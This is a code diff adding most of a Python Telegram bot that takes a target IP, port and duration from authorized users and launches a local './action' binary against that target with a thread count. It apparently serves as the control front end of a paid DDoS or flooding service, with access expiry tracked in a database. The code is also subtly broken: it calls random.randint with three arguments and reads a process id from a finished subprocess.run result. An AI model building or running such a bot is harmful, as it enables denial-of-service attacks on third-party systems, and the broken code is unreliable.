+            bot.reply_to(message, (
+                f"🔧 *Got it! Starting action in Auto Mode...* 💥\n\n"
+                f"🌍 *Target IP:* `{ip}`\n"
+                f"🔌 *Port:* `{port}`\n"
+                f"⏳ *Duration:* `{duration} seconds`\n\n"
+                "Hang tight, action is being processed... ⚙️\n\n"
+                "_This bot was made by Ibr._"
+            ), parse_mode='Markdown', reply_markup=markup)
+
+            run_action(user_id, message, ip, port, duration)
+        else:
+            bot.reply_to(message, "⚠️ *Oops!* Please provide the IP and port in the correct format: `<ip> <port>`.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+
+    elif user_mode == 'manual':
+        # Manual mode logic
+        match = manual_mode_pattern.match(text)
+        if match:
+            ip, port, duration = match.groups()
+
+            # Validate IP, Port, and Duration
+            if not is_valid_ip(ip):
+                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
+            if not is_valid_port(port):
+                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
+            if not is_valid_duration(duration):
+                bot.reply_to(message, "❌ *Invalid Duration!* The duration must be between 1 and 600 seconds.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
+                return
+
+            # Show the stop action button
+            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+            stop_button = KeyboardButton('Stop Action')
+            markup.add(stop_button)
+
+            # Respond to the user that the action is starting
+            bot.reply_to(message, (
+                f"🔧 *Got it! Starting action in Manual Mode...* 💥\n\n"
+                f"🌍 *Target IP:* `{ip}`\n"
+                f"🔌 *Port:* `{port}`\n"
+                f"⏳ *Duration:* `{duration} seconds`\n\n"
+                "Hang tight, action is being processed... ⚙️\n\n"
+                "_This bot was made by Ibr._"
+            ), parse_mode='Markdown', reply_markup=markup)
+
+            run_action(user_id, message, ip, port, duration)
+        else:
+            bot.reply_to(message, (
+                "⚠️ *Oops!* The format looks incorrect. Let's try again:\n"
+                "`<ip> <port> <duration>`\n\n"
+                "For example, type `192.168.1.100 8080 60` to run an action for 60 seconds.\n\n"
+                "_This bot was made by Ibr._"
+            ), parse_mode='Markdown')
+
+def run_action(user_id, message, ip, port, duration):
+    # Generate random thread value
+    thread_value = random.randint(40, 80, 140)
+
+    # Log the action
+    logging.info(f"User {user_id} started action on IP {ip}, Port {port}, Duration {duration}s")
+
+    # Build the full command
+    full_command = f"./action {ip} {port} {duration} {thread_value}"
+
+    process = subprocess.run(full_command, shell=True)
+        # Run the action command in a non-blocking way
+    # Start the action command as a non-blocking subprocess
+    #process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    processes[process.pid] = process
+    # Notify the user about the action start
+    bot.reply_to(message, f"🎉 *Socket Connected in {thread_value}ms", parse_mode='Markdown')
+
+    # Run the process monitor in a separate thread
+    threading.Thread(target=check_process_status, args=(message, process, ip, port, duration)).start()
+
+def check_process_status(message, process, ip, port, duration):
+    try:
+        # Wait for the specified duration
+        process.wait(timeout=duration)
+    except subprocess.TimeoutExpired:
+        # If the process is still running after the duration, terminate it
+        process.terminate()
+        try:
+            process.wait(timeout=5)  # Allow 5 seconds for graceful termination
+        except subprocess.TimeoutExpired:
+            process.kill()  # Force kill if still not terminated
+            process.wait()
+
+    # Remove the process from the active list after completion
+    processes.pop(process.pid, None)
+
+    # Create the button markup for the response
+    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    manual_button = KeyboardButton('Manual Mode')
+    auto_button = KeyboardButton('Auto Mode')
+    markup.add(manual_button, auto_button)
+
+    # Send completion message to the user
+    bot.reply_to(message, (
+        f"✅ *Action completed successfully!* 🎉\n\n"
+        f"🌐 *Target IP:* `{ip}`\n"
+        f"🔌 *Port:* `{port}`\n"
+        f"⏱ *Duration:* `{duration} seconds`\n\n"
+        "💡 *Need more help?* Just send me another request, I'm here to assist! 🤗\n\n"
+        "_This bot was made by Ibr._"
+    ), parse_mode='Markdown', reply_markup=markup)
+
+def stop_all_actions(message):
+    if processes:
+        for pid, process in list(processes.items()):
+            process.terminate()
+            process.wait()
+            processes.pop(pid, None)
+        bot.reply_to(message, "🛑 *All actions have been stopped!* 🙅‍♂️", parse_mode='Markdown')
+    else:
+        bot.reply_to(message, "🤔 *No ongoing actions to stop.*", parse_mode='Markdown')
 
 
+# Periodic Tasks
+def check_expired_users():
+    """Periodically check for expired users and update their status."""
+    now_utc = datetime.now(KOLKATA_TZ).astimezone(pytz.utc)
+    expired_users = actions_collection.find({'status': 'authorized', 'expire_time': {'$lte': now_utc}})
+    for user in expired_users:
+        actions_collection.update_one({'user_id': user['user_id']}, {'$set': {'status': 'expired'}})
+    threading.Timer(900, check_expired_users).start()  # Run every 15 minutes
 
+# Start the Bot
+if __name__ == '__main__':
+    logging.info("Starting the bot...")
+    load_authorizations()
+    check_expired_users()
+    bot.polling(none_stop=True)
